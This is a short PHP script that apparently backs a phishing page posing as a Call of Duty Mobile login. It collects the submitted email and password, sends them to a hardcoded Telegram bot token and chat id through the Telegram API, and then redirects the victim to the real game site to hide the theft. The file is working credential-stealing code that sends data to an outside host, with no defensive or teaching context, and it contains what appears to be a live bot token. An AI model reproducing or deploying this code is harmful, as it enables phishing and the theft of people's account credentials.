<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $token = "7693366029:AAF_HZzdqPqkF1LlmNjA9O8-TbdOhPPcgyk";
    $chat_id = "7182702425";
    
    $message = "🚨 New Login 🚨\n\nEmail: $email\nPassword: $password";
    
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
    file_get_contents($url);

    header("Location: https://www.callofduty.com/mobile"); // Redirect to real site
    exit();
}
?>